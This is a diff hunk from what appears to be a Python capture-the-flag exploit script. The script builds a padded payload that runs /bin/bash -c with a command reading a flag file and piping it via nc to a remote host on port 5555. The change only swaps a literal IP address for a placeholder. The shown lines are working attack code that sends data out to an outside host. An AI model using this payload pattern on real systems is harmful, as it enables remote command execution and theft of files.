@@ -67,7 +67,7 @@ payload += "/bin/bash"
 payload = payload.ljust(0x178, '\x00')
 payload += "-c"
 payload = payload.ljust(0x188, '\x00')
-payload += "cat /home/o*/flag|nc 35.201.204.228 5555"
+payload += "cat /home/o*/flag|nc xxx.xxx.xxx.xxx 5555"
 payload = payload.ljust(0x234, '\x00')
 log.info("length: %#x" %len(payload))
 r.send(payload)
